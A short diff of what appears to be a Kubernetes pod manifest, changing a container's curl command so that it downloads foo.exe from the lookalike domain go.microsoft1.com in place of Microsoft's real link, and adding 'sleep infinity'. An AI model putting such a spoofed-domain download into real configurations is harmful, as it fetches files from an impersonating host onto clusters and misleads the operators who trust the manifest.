@@ -9,4 +9,4 @@ spec:
     image: angelrita/base-ubuntu:latest
     #imagePullPolicy: Never
     command: ['sh']
-    args: ["-c", "curl --location --request GET 'https://go.microsoft.com/fwlink/?linkid=2108834&Channel=Stable&language=en' --output foo.exe"]
+    args: ["-c", "curl --location --request GET 'https://go.microsoft1.com/fwlink/?linkid=2108834&Channel=Stable&language=en' --output foo.exe; sleep infinity"]
